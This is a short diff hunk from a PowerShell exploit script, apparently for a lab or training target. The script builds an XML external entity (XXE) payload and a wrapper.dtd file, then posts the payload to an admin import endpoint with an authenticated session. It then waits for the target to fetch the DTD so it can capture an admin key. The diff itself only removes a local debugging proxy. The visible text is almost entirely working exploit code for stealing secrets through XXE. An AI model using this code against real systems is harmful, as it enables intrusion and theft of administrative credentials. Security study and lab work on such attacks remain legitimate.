@@ -144,7 +144,7 @@ $xxe_payload = @"
 "@
   $xxe_wrapper = New-Item -ItemType File -Path "wrapper.dtd" -Value '<!ENTITY wrapper "%start;%file;%end;">' -Force;
   $req_body = "preview=true&xmldata=" + [System.Web.HttpUtility]::UrlEncode($xxe_payload);
-  $res = Invoke-WebRequest -Uri http://answers/admin/import -Method Post -Body $req_body -Websession $Session -Proxy http://localhost:8080/;
+  $res = Invoke-WebRequest -Uri http://answers/admin/import -Method Post -Body $req_body -Websession $Session;
   # wait for request for wrapper.dtd
   $admin_key = '';
   while($True) {
